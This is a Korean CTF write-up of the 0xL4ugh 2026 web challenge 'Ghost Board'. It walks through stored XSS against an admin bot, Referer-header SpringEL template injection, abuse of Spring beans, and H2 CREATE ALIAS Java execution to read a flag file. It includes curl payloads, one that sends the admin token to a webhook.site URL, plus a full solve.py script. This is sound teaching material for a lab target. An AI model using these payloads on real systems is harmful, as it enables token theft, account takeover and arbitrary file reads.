---
title: "[0xL4ugh-CTF][web] Ghost Board"
date: 2026-01-26 01:00:00 +0900
categories: [CTF, 0xL4ugh-CTF-2026]
tags: [web]
toc: true
comments: false
---

## TL;DR

Ghost Board는 아래 취약점이 **체인**으로 이어져 플래그 파일(`/flag-*.txt`)을 읽을 수 있다.

- **Stored XSS**: 게시글 렌더링 필터링 부실 → JS 실행 가능
- **Admin Bot 방문**: `/api/visit` 트리거 시 admin 봇이 게시글 열람 → admin 컨텍스트에서 XSS 실행
- **SSTI (SpringEL/Thymeleaf)**: `/api/admin/dashboard`에서 `Referer` 헤더가 서버 템플릿에서 평가됨
- **Spring Bean 접근 가능**: `@environment`, `@userRepository`, `@jdbcTemplate` 등 접근 가능
- **H2 Java ALIAS**: DB에서 `CREATE ALIAS ... AS $$ <Java> $$`로 Java 코드 실행 → `/flag-*.txt` 읽기

플래그는 컨테이너 루트(`/`) 아래 랜덤 파일 **`/flag-*.txt`**에 존재한다.

---

## Overview

서비스 기능:

- 게시글 작성/조회: `POST /api/boards`
- 관리자 대시보드: `GET /api/admin/dashboard`
- 관리자 봇 방문 트리거: `POST /api/visit`

공격 목표:

1) XSS로 **관리자 JWT(ADMINJWT)** 탈취  
2) ADMINJWT로 `/api/admin/dashboard` 접근 후 **Referer SSTI** 실행  
3) Bean 접근 + H2 ALIAS로 `/flag-*.txt`를 찾아 읽고 플래그 출력

---

## Solution

### 1) Recon

주요 엔드포인트:

- `POST /api/auth/register` : 회원가입
- `POST /api/auth/login` : 로그인 → JWT 발급(응답의 `token`)
- `POST /api/boards` : 게시글 작성(콘텐츠가 HTML로 렌더링됨)
- `POST /api/visit` : 관리자 봇이 게시글을 방문
- `GET /api/admin/dashboard` : 관리자 대시보드(**Referer 평가 지점**)

관찰 포인트:

- 게시글에서 스크립트 실행 가능 → **Stored XSS**
- 봇이 admin 세션으로 게시글 열람 → XSS가 **admin 컨텍스트**에서 실행
- 대시보드에서 `Referer`가 SpringEL로 평가됨 → **SSTI**

---

### 2) Root cause

#### (1) Stored XSS

게시글 내용이 출력될 때 escaping/sanitization이 충분하지 않아 스크립트 실행이 가능하다.  
봇이 이를 admin으로 열람하므로 `localStorage` 등에 저장된 토큰을 유출할 수 있다.

#### (2) Admin Bot 방문

`/api/visit`는 공격자가 만든 게시글을 **관리자 봇이 대신 방문**하도록 만든다.  
즉, 공격자는 admin 화면에 직접 접근하지 않아도 **admin을 페이로드로 유도**할 수 있다.

#### (3) Referer 기반 SSTI (SpringEL/Thymeleaf)

`/api/admin/dashboard`가 `Referer` 헤더를 템플릿 렌더링 중 SpringEL로 평가한다.

 `Referer: ' + ${7*7} + '` 를 주면 화면에 `49`가 노출되어 SSTI가 확인된다.

#### (4) Bean 접근 가능

샌드박스에서 파일/명령 실행이 막혀 있어도, SpringEL에서 Bean 접근이 가능하다.

- `@environment` : 환경 조회
- `@userRepository` + `@passwordEncoder` : DB의 admin 계정 패스워드 변경
- `@jdbcTemplate` : SQL 실행 및 H2 기능 사용

#### (5) H2 Java ALIAS로 파일 읽기

H2는 `CREATE ALIAS ... AS $$ <Java> $$`로 Java 코드를 실행하는 사용자 함수를 만들 수 있다.  
`@jdbcTemplate.execute()`로 ALIAS를 만들고 `SELECT ALIAS()`로 호출해 `/`에서 `flag-` 파일을 찾아 읽는다.

---

### 3) Exploit / Reproduction

> 토큰 탈취(XSS) 단계는 Webhook/RequestBin 같은 외부 수신 URL이 필요하다.

#### 3.1 타겟 설정

```bash
export TARGET="http://challenges.ctf.sd:34513"
```

#### 3.2 회원가입/로그인 → 유저 JWT 획득

```bash
USER="test"
PASS="test"

curl -s -X POST "$TARGET/api/auth/register"   -H "Content-Type: application/json"   -d "{"username":"$USER","password":"$PASS"}" >/dev/null

TOKEN=$(curl -s -X POST "$TARGET/api/auth/login"   -H "Content-Type: application/json"   -d "{"username":"$USER","password":"$PASS"}"   | jq -r ".token")

echo "$TOKEN"
```

#### 3.3 Stored XSS 게시글 작성 (ADMINJWT 탈취 준비)

Webhook으로 `localStorage.getItem("token")`을 유출:

```bash
WEBHOOK="https://webhook.site/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"

DATA=$(python3 - <<'PY'
import json
title = "ghost-board"
content = "[]..filter.constructor(\"new Image().src='WEBHOOK?token='+encodeURIComponent(localStorage.getItem('token'))\")()"
content = content.replace("..", ".")  # markdown 렌더링 안정화용
print(json.dumps({"title": title, "content": content}))
PY
)

DATA="${DATA/WEBHOOK/$WEBHOOK}"

curl -s -X POST "$TARGET/api/boards"   -H "Authorization: Bearer $TOKEN"   -H "Content-Type: application/json"   -d "$DATA" >/dev/null
```

#### 3.4 봇 방문 트리거 → ADMINJWT 확보

```bash
curl -s -X POST "$TARGET/api/visit"   -H "Authorization: Bearer $TOKEN" >/dev/null
```

Webhook 로그에서 `token=` 값을 확인:

```bash
export ADMINJWT="(웹훅에서 획득한 관리자 토큰)"
```

#### 3.5 Referer SSTI 확인

```bash
curl -s "$TARGET/api/admin/dashboard"   -H "Authorization: Bearer $ADMINJWT"   -H $'Referer: \x27 + ${7*7} + \x27' | grep -n "redirectAfterLogin"
```

응답에 `49`가 포함되면 SSTI 확정.

#### 3.6 Bean 접근 확인

```bash
curl -s "$TARGET/api/admin/dashboard"   -H "Authorization: Bearer $ADMINJWT"   -H $'Referer: \x27 + ${@environment.getProperty(\x27java.version\x27)} + \x27' | grep -n "redirectAfterLogin"
```

#### 3.7 관리자 계정 비밀번호 강제 재설정

```bash
curl -s "$TARGET/api/admin/dashboard"   -H "Authorization: Bearer $ADMINJWT"   -H $'Referer: \x27 + ${ {#u=@userRepository.findByUsername("admin").get(), #u.setPassword(@passwordEncoder.encode("Admin!234567")), @userRepository.save(#u), "OK"}[3] } + \x27' | grep -n "redirectAfterLogin"
```

이후 `admin / Admin!234567`로 로그인하여 `ADMIN_TOKEN` 획득:

```bash
ADMIN_TOKEN=$(curl -s -X POST "$TARGET/api/auth/login"   -H "Content-Type: application/json"   -d "{"username":"admin","password":"Admin!234567"}" | jq -r ".token")

echo "$ADMIN_TOKEN"
```

#### 3.8 H2 Java ALIAS로 `/flag-*.txt` 읽기

(1) ALIAS 생성:

```bash
curl -s "$TARGET/api/admin/dashboard"   -H "Authorization: Bearer $ADMIN_TOKEN"   -H $'Referer: \x27 + ${@jdbcTemplate.execute(\'CREATE ALIAS IF NOT EXISTS GETFLAG2 AS $$ String getflag2() throws Exception { try (java.util.stream.Stream<java.nio.file.Path> s = java.nio.file.Files.list(java.nio.file.Paths.get("/"))) { java.nio.file.Path p = s.filter(x -> x.getFileName().toString().startsWith("flag-")).findFirst().orElse(null); if (p==null) return "NF"; return java.nio.file.Files.readString(p); } } $$\')} + \x27' >/dev/null
```

(2) ALIAS 실행 → 플래그 출력:

```bash
curl -s "$TARGET/api/admin/dashboard"   -H "Authorization: Bearer $ADMIN_TOKEN"   -H $'Referer: \x27 + ${@jdbcTemplate.queryForList(\'SELECT GETFLAG2() AS F\')[0].get(\'F\')} + \x27' | grep -oE "0xL4ugh\{[^}]+\}"
```

---

### 4) Why it works
- **XSS**로 관리자 봇에서 JS가 실행되며 **ADMINJWT**를 탈취한다.
- 탈취한 토큰으로 `/api/admin/dashboard`에 접근하고, `Referer`가 **템플릿에서 평가(SSTI)** 되어 서버에서 SpringEL이 실행된다.
- SpringEL에서 Bean(`@jdbcTemplate` 등) 접근이 가능해 DB에 SQL을 실행할 수 있고,
- H2의 **Java ALIAS** 기능으로 JVM 코드가 실행되어 `/flag-*.txt`를 읽는다.

## Flag
```text
0xL4ugh{c0ngr47z_y0u_did_wh47_sh4d0w_did_in_bug_b0un7y_cef24d181cf97ee3342cfd5284e0bf57}
```

---
## Notes
- **Stored XSS → Admin bot → Referer SSTI → Bean 접근 → H2 ALIAS → 파일 읽기**

---

## solve.py

```bash
#!/usr/bin/env python3
import argparse
import json
import re
import sys
import requests

def die(msg: str, code: int = 1):
    print(f"[!] {msg}", file=sys.stderr)
    raise SystemExit(code)

def ssti_get(session: requests.Session, target: str, jwt: str, expr: str) -> str:
    # expr: raw SpringEL expression (without ${})
    referer = "' + ${" + expr + "} + '"
    r = session.get(
        f"{target}/api/admin/dashboard",
        headers={"Authorization": f"Bearer {jwt}", "Referer": referer},
        timeout=20,
    )
    r.raise_for_status()
    return r.text

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", required=True, help="Base URL, e.g. http://host:port")
    ap.add_argument("--adminjwt", required=True, help="Admin JWT stolen via XSS (from webhook)")
    ap.add_argument("--newpass", default="Admin!234567", help="Password to set for admin user")
    args = ap.parse_args()

    target = args.target.rstrip("/")
    adminjwt = args.adminjwt.strip()
    newpass = args.newpass

    s = requests.Session()

    # 1) SSTI sanity check
    html = ssti_get(s, target, adminjwt, "7*7")
    if "49" not in html:
        print("[*] SSTI check did not obviously show 49. Continuing anyway...")

    # 2) Reset admin password via userRepository + passwordEncoder
    expr_reset = (
        '{#u=@userRepository.findByUsername("admin").get(), '
        f'#u.setPassword(@passwordEncoder.encode("{newpass}")), '
        '@userRepository.save(#u), "OK"}[3]'
    )
    _ = ssti_get(s, target, adminjwt, expr_reset)
    print(f"[+] Requested admin password reset to: {newpass}")

    # 3) Login as admin
    r = s.post(
        f"{target}/api/auth/login",
        headers={"Content-Type": "application/json"},
        data=json.dumps({"username": "admin", "password": newpass}),
        timeout=20,
    )
    r.raise_for_status()
    admin_token = r.json().get("token")
    if not admin_token:
        die("Failed to obtain admin token after reset")
    print("[+] Got ADMIN_TOKEN")

    # 4) Create H2 alias GETFLAG2
    alias_sql = (
        'CREATE ALIAS IF NOT EXISTS GETFLAG2 AS $$ '
        'String getflag2() throws Exception { '
        'try (java.util.stream.Stream<java.nio.file.Path> s = '
        'java.nio.file.Files.list(java.nio.file.Paths.get("/"))) { '
        'java.nio.file.Path p = s.filter(x -> x.getFileName().toString().startsWith("flag-")).'
        'findFirst().orElse(null); '
        'if (p==null) return "NF"; '
        'return java.nio.file.Files.readString(p); '
        '} } $$'
    )
    alias_sql_escaped = alias_sql.replace("'", "''")  # for execute('...')
    expr_alias = f"@jdbcTemplate.execute('{alias_sql_escaped}')"
    _ = ssti_get(s, target, admin_token, expr_alias)
    print("[+] Created GETFLAG2 alias")

    # 5) Call alias: SELECT GETFLAG2()
    expr_call = "@jdbcTemplate.queryForList('SELECT GETFLAG2() AS F')[0].get('F')"
    html = ssti_get(s, target, admin_token, expr_call)

    m = re.search(r"0xL4ugh\{[^}]+\}", html)
    if not m:
        die("Flag pattern not found in response")
    print("[+] FLAG:", m.group(0))

if __name__ == "__main__":
    main()

```

